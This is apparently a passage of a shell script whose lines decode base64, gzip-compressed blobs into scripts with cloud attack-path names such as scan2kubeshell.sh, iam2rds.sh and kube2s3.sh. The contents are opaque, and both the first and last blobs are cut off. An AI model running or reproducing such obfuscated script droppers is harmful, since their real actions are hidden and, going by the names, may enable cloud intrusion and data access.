+srhrd16oopL9VWglv4DqV9bJ1fm4afslczMo4lJZYN49+sUVgWev3343Zr1HEru3ber77Khn288xbvnOOdYbXmHF8OBp3eaEUyF6wZKoe91sXwbX80bg16JS49s7FlMm9PV3ZKWUNl/mYdmxmfhVQpOtJ5wLjgsQfK4hmEsnj+rMwmLnGBK5mLclWazBSc0qVbio8fLZNuWYsVKSjPJArVucKbmMolVNtHw4ya4mtL8mouKGIdxRo0vddZGBxBJgmtQS+JgDIZWQi8L42M5SgALcATYRRQncyQGXVmxoSy1zIpH76Zw400PEYNT4fIZJBtDwvkOezMxv5EE2YGXdBzCqfnQ1jQJTDf2mUMX9Bl1zfn0iRCF6FK5vgFXaqCh1O6VB8/mbTt+tWtekrOzLUydXN1UPn4qVpLDwT2YF2xKBwwaBifCrcAk5c+gxubv5j5gJIVaAXhOdXEJ5pUH22+fQvcL511a2VwBpT5zc1JyXcru/YNyl6hUvPsJDLVYn26ygFgU/gIKHuAwAVkzuQIPv1q+OE2IkatN+N3rbPLjvuIEkmViKVHk2xb54tvsbPUC0Zk9qQJmIx1r1CPhDSr0CMySxLXvUL+BC9CZaFsKhdXyFbubBWqFRcqaETMuS63ODmupV4qnppusM1Oq37M9jgRMfebaYyh9NXp+XB82vlg22wWfObfRFKysN+nzLF/itsKkz2mcXWNtkLB01RLTiB2gpAiPYcO2sNx53czTYwH/bNOqSmYgSfhV5hz8/MHNlQfmJUrzJknhjPDkfQVVgc4QWR3+RpXLcmzpmrKS8mWJlTWWJK5oGMFH3dVU0/VgfVCum7UGp6Ou+1Ob9Q96ZrDSF4AU5Bfbz2rulZbrNJE5qo0UYu/rcOWdK7U6vV25cvSvCWSPy3rucwBnsTegmo71Zs2Q719PCHeIo42+qO8OpJ0yu4BVcqjCcolGAkT7i2KNSTmklmaMd8thXm5xFkvjIhaqI8/faoPrXWmK9egHAdgXU8kb646yAbMEzlWntnW+/PxIJ0HGC3pUZroWK307byHlOhT/+SYeHpdlNy4ZXe+VsVw1BpdDtedEtaYucHU8stH1havimNDJvpNJm+bCisD4ONQs+RWVyRXJkDzqNxEEiclHeS4f35x1jE5sdom0hvEcjAWg52KPY8qNY2DYFlH+YqiT9BgzVYnre5Zp73FRlPCAuqXFNN7pmFvs+ae4HRrvSAk+IIqeytP75nSz9jpO+yi6GZdzNRtFgRmFo2kmEmqVB2O05vRJKubkCHM9eR3u2nPLl3xDk0bsHXiIL0QNAOvOmg2GttV18ZKKW1sCm/3EJL/dNpUtcKFvdL8gkxyq3wAXvT8srSuKv3tRjZSxV8yogTQi6Vit3TTvfdxQImdlOJo9exdrgj2BiSdsx+f4PKbzSbg6etaqdKbrP1rh+sVfz7nkNZtb7K3bZL2/wAAAP//AQAA//+Sn34QxhwAAA== | base64 -d | gunzip > resources/instance2rds.sh
echo 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 | base64 -d | gunzip > resources/iam2rds.sh
echo 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 | base64 -d | gunzip > resources/azureiam2azuresql.sh
echo H4sIAAAAAAAA/7RVbXMaNxf9rl9xs6wDOI92g+dJPcXBE2pvHFJsXJt0mno8ttCKXeFdaVlJ2A3Q397R7pqXJG7azJQvgKR7ztG59+rWnvkjLvwRUTG6PLronQ/PuqdBJ6IZJ+keTaQJ1TRB/cHJ214/6Pg6zXx3fdBLZITGRlDNpYBERjAHBADAaCzhNiSaATbwwtn5iHdSvBMOd961d07bO5e/O7cOuC0Hnj//F4cPD8GttABaotPub/3BSWcPjWUOHLiAW8Wm4DYa5Q5uNZuAW9C6PYBQQjoD5zHcc+Yu/5/baPAXrWZzCXuHfshmvjBJAosF6NwwGyMYSmdrznV4y/laCEIxS7JGc44o0fD6dTB4h4wiEWvDhmtwheNruMJ4ZOgd09jkSeenD0c/B8ObDxf9a4RwDF/9ZDkXGnTMFaRMWVwgIgT2wDXaRNuM0TGDcgfsjnVKTRNgD5nMNbICi3w9cA0ttERrKx33jWMtQACUKAauXS0O43iBsb1oEz2yvAv65x3HnfPabmfprJZVzMcaapARpYHkkUmZ0J0ZSQxbnbFAqz8HByXDqLO72PJnd821tuo7GSuSFWQNjLgT8l6AzGwho41jTBGKijpAfAxXgD+BuxYA1wfW4DLClr+Ts6nhOQsrKNhKi5AaVMYoH3MWlpqL2485QkX0sbwXiSQhFxFMpp7nOZb1GVCZpjbTeAaTaUkJ1CLi/nvAEnyj8qKRJ1OItc5U2/cjrmMz8qhM/ck0ISLyJ1M/Zwkjiik/rJj8yRS3vH37lXBhHjBJwx/+b7uSxqkMYf/Vq030A1hpzcwo4RR41ga3UYpRK3JOiYjJJ55Z/qaDUA0imgG1ziimTYbKAoSTweCkH9x0z8/7vaPusDc4uzm6CI6Ds2Gv27/s/Ol7VIoxj/yoeIx8i8CE5iRR3kRJgcp1IEbHQKjmM6IZViyfccowoVQaoQHjO/YHHvOEwTcRYQGaMcBk1fbo/GLwPjgadtzGJlvClUUe80SzvKM00Ua1u0fD3q+BXZZ5SnTHKUqvUQlpOrAAcn8H+C04bxyoz6uedvdgWYcFKBZCXfkeJ6kXVbeoYotM+lG9iT5cBhf/pZYWLOtNdByc9wcfT4Mze+/iiXbnlrlW28XLps1oyc+ESVlOisZRVBpdZBp/kYNvG49xzmxR4JDnsDlm/AK32gWMs1xOGNWYhx23yg1gLCQe5fJesRz2Dp+3vswjrESXL+CYJ6AEyVQsdfWQFo/i5S/9m97Z5bB7dhRcro22QVwoTQRl6tHxSsqmjke37Z2cZtksY2nEZwhtcOdbTEtni3nl+tYhWMBkCjgHjEkeAQd3nSeoe1fXRREljOqGJ0jKYAFMhOqe67jh8mYTFlCs17eEaZJHTK+0tbdJS13HwbDb6z/pR8gUzfmIbYf+c4c+kwAh04QnqpJSkZdK1u24Nqg6sLKn7lW89Sfwq+0Kv4Is8S+Ck97g7BvwOYu4FE+hl7sVeInnoFo1uo3SMLJndM7ZzM4KoxUPWTGrtcxBMH0v8ztoN1CtGnebvmuZ29FfDpa/rcTyOXASSYv+7GzK+TIPtc3R+nj7iv476o5KoQkXalV3lfAbkyd1yxYpo3kCiQKcbE3Vp9p3S6AT2UETjvCI0DuT4TIFmIz291+29gj+kb1s+Q7aKNZq5NifX7Fru24dd77mWm536vImNGnmRZ+cp5T+BQAA//8BAAD//zlbvRRXCwAA | base64 -d | gunzip > resources/gcpiam2cloudsql.sh
echo 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 | base64 -d | gunzip > resources/scan2kubeshell.sh
echo H4sIAAAAAAAA/7RU72/bNhD9zr/iTbGLpJ1M/8D2wa0NZIHSFHXmwvaG/YRDUyeLiERqJKU0afq/D7LcOE7SoQVW6dvde7x3vHs8+I6vlOYr4VI2P5m9ebf4+fg8GgWX5Yr6bhCwyfT16ZtJNAq4zwve2mE6mVkHLCm19MpoZGaNDwwASKYGF7HwhLDEi6D9e9jOw3a8aJ8N2+fD9vyP4CJAqxd8HRrjMVpbNewjOz/+bTJ9PeqzxFgoKI0LR/+gdXjYZMLe0RHCHnoXLxEb5BWCT+xO8KGlvm8dHqoXvaOjj+iPeUwV12WW4fYW3pZUczSxvLoreY/eC56iMCaFx6tX0fR0T+os+jWazaPl/CyaTJZn0/li1HocewB7N509gtUxFk1PGavvOnBeWK/0utPpBE2kKFeZklDFEK1DWdoMoUPqfeGGnCspdCpuVNGRJj/aMlalvCQPLXJCYk0O0tUQrZ9+OXkbLZb1lLdAaUnUxZAZKTI4b6xY06b0ZHpyPFnOF9NZNNrsSL06y+ZkphL8iTCpb+MOhb9fwqekN+O3OUK7n2eJYvllrCzCYj/RSElJXkJcOaiYtFf+eiOjDjjvsCYfSpFlZMNPefTHz3q4hSdCKHaTYQcgJ0VBKKyqVEZriiGN9kJpsvAG2sSEK+VTWKrIOoJLKct28niuPa9Ry0Rl5K6dp5zlptQezYJUOXV1r+h9Bvlf5/BKWO4KYzIurdFs45SQEDzngy6eb39rjMfieP52pETeJ13muHM0QoXxs0aJlwV/Yu8exuolQ7e+r7/0wVd/AcZPt0JebproxLwW/JlevkEb/2sX+wNpOpFpbmL82O1+MQVMpuZKozv8cs5mV98nKmtsWlgTY2uxjSksydI6VRGkKa4b0H0b18t830o7ywwgC7jBkPP7eL7v2DDcFXjsIy8swhtZJXjo/45f3+yf9Ji90S/iuH5dfkCudOkJMWXiGitKjCXQe3X30LmMqMCg22149SvdCf4FAAD//wEAAP//7MyrC8UGAAA= | base64 -d | gunzip > resources/kube2s3.sh
echo H4sIAAAAAAAA/5xVbW/TSBf9Pr/i4DqQwDPxk2oBKSXVlioL7KYtKq32BSE6sSf2hPGMMy8JS9P97atxHKeCgtT1l8Tjc+85995z7b0HyVSoZMpsQci74/M3by9Oj07GI8HKfa58SSZnr355MxmPEldWSbxD9KXOycyr1AmtIHWOawIAPC00rjLmOKjHk6jzJ+2UtJNddF4POyfDzru/oqsI8SC6HxqHh4gbLeSGnBz9MTl7NdonM20gIBSuLF8g7nY3T+ig1wMdYHB1gEyjXCLaRvej61j8L+52xZNBr3eD/cMk48tEeSmxXsMZz0OM4qRctpS3wgfRXSGEFFxW3d41SZnDixfjs9fEW5bzIW41De9p8QHvKZ369BN31Bs5enl5/Nv44uPl+eQDIbTAnVdlhHJwhbAouQ15wVQG/lk4Qmll9ExI/lWMKzjYymL71Gl4y9HN+Ix56YZo/vRIEFtP47NwGJAbsmtrFP8chXYQIGWWIw6nNZgWa0pD0T2yZXw9nrwdRfG12Hs8uonaY1uImcMeKmYdmMl9yZUbLZn0vMWERO3NwcGGoRo9XrfVjR7viN6en9Wm/G9cTfo23x68+qT0SkFXwc3kFoxblpLaDUTM8B70C+KGHR8OQo838LAA0bbTSjtY7uCtUDm+7vdGbFtCezoThOjK2VFEqdI0lYJWLOcmqqkfINVlGYZOl5gvWurUGwk6+RVUI/HWJFKnTNZLPV+gcK6ywyTJhSv8tJ/qMpkvJFN5Ml8khkvOLLdJpldKapYl8wUd9J+HHymU/0xZmT37CQ8fIi1KneH506ffctS69+6+yF7twNTwLDTEV98Fkk0D/V